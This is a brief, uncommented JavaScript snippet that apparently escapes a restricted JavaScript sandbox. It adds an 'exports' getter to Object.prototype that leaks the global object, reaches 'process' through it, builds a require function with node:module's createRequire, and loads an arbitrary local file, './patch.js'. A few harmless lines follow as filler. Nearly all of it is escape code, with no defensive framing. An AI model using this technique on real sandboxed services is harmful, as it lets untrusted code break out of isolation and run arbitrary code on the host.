Object.prototype.__defineGetter__("exports", function () { return this; });
const req = exports.process.getBuiltinModule("node:module").createRequire(exports.process.cwd() + "/");
req("./patch.js");
const p = parseInt("12");
const m = Math.random();
console.log(typeof p, typeof m);
